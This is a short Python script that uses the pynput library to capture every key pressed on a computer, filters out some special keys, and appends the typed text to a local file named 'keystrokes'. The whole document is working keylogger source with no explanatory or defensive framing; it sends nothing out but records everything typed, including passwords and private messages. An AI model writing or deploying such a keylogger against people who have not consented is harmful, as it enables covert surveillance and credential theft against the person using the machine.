from pynput.keyboard import Listener

def keylogger(character):
    key = str(character)
    key = key.replace("'", "")

    if key == 'Key.caps_lock':
         key = ''
    
    if key == 'Key.ctrl':
         key = ''

    if key == 'Key.shift':
         key = ''
     
    if key == 'Key.space':
         key = ' '
    
    if key == 'Key.backspace':
         key = ''
    
    if key == 'Key.enter':
         key = "\n"
         

    with open('keystrokes', 'a') as ffile :
        ffile.write(key)


    
with Listener(on_press = keylogger) as listener:
        listener.join()